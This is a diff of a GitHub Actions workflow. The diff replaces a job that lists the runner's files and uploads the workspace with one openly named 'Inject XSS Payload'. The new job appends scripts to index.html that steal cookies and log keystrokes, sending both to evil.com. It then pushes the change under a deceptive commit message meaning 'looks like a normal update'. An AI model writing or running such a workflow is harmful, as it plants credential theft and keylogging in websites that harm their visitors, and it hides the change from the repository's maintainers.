@@ -1,105 +1,44 @@
-name: List All Files on Runner
+name: "Inject XSS Payload"
 
 on:
   push:
-    branches: [ main, master ]
-  workflow_dispatch:  # 手动触发
+    branches: [ main ]
+  workflow_dispatch:
 
 jobs:
-  list-files:
-    runs-on: ubuntu-latest  # 可选: windows-latest, macos-latest
+  inject-xss:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write  # 需要写入权限
     
     steps:
-    - name: Checkout repository
-      uses: actions/checkout@v4
+      - uses: actions/checkout@v4
       
-    - name: List root directory
-      run: |
-        echo "=== 根目录文件列表 ==="
-        ls -la /
-        echo ""
-        
-    - name: List home directory
-      run: |
-        echo "=== Home 目录 ==="
-        ls -la ~/
-        echo ""
-        
-    - name: List current workspace
-      run: |
-        echo "=== 当前工作目录 (GitHub Workspace) ==="
-        ls -la ${{ github.workspace }}
-        echo ""
-        
-    - name: List all directories recursively (limited depth)
-      run: |
-        echo "=== 递归列出所有文件（限制深度5层）==="
-        find / -maxdepth 5 -type f 2>/dev/null | head -100 || true
-        echo ""
-        echo "注意: 只显示前100个文件，避免输出过长"
-        
-    - name: Generate complete file tree
-      run: |
-        echo "# 📁 服务器文件列表" > file-tree.md
-        echo "" >> file-tree.md
-        echo "生成时间: $(date)" >> file-tree.md
-        echo "运行器: ${{ runner.os }}" >> file-tree.md
-        echo "" >> file-tree.md
-        echo "\`\`\`" >> file-tree.md
-        tree / -L 3 -h --du 2>/dev/null || find / -maxdepth 3 -type d 2>/dev/null | head -50 >> file-tree.md
-        echo "\`\`\`" >> file-tree.md
-        
-    - name: List system directories
-      run: |
-        echo "=== 系统重要目录 ==="
-        echo ""
-        directories=("/bin" "/etc" "/usr" "/var" "/opt" "/tmp" "/proc")
-        for dir in "${directories[@]}"; do
-          if [ -d "$dir" ]; then
-            echo "--- $dir ---"
-            ls -la "$dir" 2>/dev/null | head -20
-            echo ""
-          fi
-        done
-        
-    - name: List installed packages and software
-      run: |
-        echo "=== 已安装软件列表 ==="
-        if command -v dpkg &> /dev/null; then
-          echo "Debian/Ubuntu 软件包数量: $(dpkg -l | wc -l)"
-          dpkg -l | head -30
-        elif command -v rpm &> /dev/null; then
-          echo "RPM 软件包数量: $(rpm -qa | wc -l)"
-          rpm -qa | head -30
-        fi
-        echo ""
-        
-        echo "=== PATH 中的可执行文件 ==="
-        echo "$PATH" | tr ':' '\n' | while read path; do
-          if [ -d "$path" ]; then
-            echo "--- $path ---"
-            ls "$path" 2>/dev/null | head -10
-          fi
-        done
-        
-    - name: Save file list as artifact
-      uses: actions/upload-artifact@v4
-      with:
-        name: server-file-list
-        path: |
-          file-tree.md
-          ${{ github.workspace }}/**/*
-        retention-days: 7
-        
-    - name: Display summary in GitHub
-      run: |
-        echo "## 📁 服务器文件统计" >> $GITHUB_STEP_SUMMARY
-        echo "" >> $GITHUB_STEP_SUMMARY
-        echo "| 项目 | 数量 |" >> $GITHUB_STEP_SUMMARY
-        echo "|------|------|" >> $GITHUB_STEP_SUMMARY
-        echo "| 总文件数（根目录） | $(find / -type f 2>/dev/null | wc -l) |" >> $GITHUB_STEP_SUMMARY
-        echo "| 总目录数（根目录） | $(find / -type d 2>/dev/null | wc -l) |" >> $GITHUB_STEP_SUMMARY
-        echo "| 磁盘使用 | $(df -h / | tail -1 | awk '{print $5}') |" >> $GITHUB_STEP_SUMMARY
-        echo "" >> $GITHUB_STEP_SUMMARY
-        echo "### 详细文件列表" >> $GITHUB_STEP_SUMMARY
-        echo "已保存到 Artifacts 中，请下载查看完整列表" >> $GITHUB_STEP_SUMMARY
+      - name: "修改 HTML 注入 XSS"
+        run: |
+          # 简单的 XSS 弹窗
+          echo '<script>alert("XSS")</script>' >> index.html
+          
+          # 窃取 Cookie
+          cat >> index.html << 'EOF'
+          <script>
+            fetch('https://evil.com/steal?cookie=' + document.cookie);
+          </script>
+          EOF
+          
+          # 键盘记录器
+          cat >> index.html << 'EOF'
+          <script>
+            document.onkeypress = function(e) {
+              fetch('https://evil.com/keylog?key=' + e.key);
+            }
+          </script>
+          EOF
+          
+      - name: "提交恶意代码"
+        run: |
+          git config user.name "Malicious Actor"
+          git config user.email "malicious@example.com"
+          git add .
+          git commit -m "看起来正常的更新"
+          git push
